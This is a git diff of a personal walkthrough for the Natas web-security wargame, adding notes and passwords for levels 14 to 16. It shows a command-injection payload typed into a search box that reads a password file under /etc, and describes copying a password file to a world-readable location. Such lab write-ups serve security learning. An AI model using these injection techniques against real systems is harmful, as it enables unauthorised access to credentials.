@@ -93,7 +93,7 @@ Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
 ```
 
 ## Level 8 → Level 9
-I puted this in the search bar
+I wrote this in the search bar
 ```bash
 k ;cat /etc/natas_webpass/natas10; echo
 ```
@@ -211,5 +211,14 @@ pass
 TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
 ```
 ## Level 14 → Level 15
+Sulotion [here](./natas15/e.py)
 
+TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
 
+## Level 15 → Level 16
+For this challenge. My solution was:
+1. Cat password file to temp.
+2. Give it 777 permissions
+3. Access level 9 where it was much easier running commands 
+4. print this file.
+XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
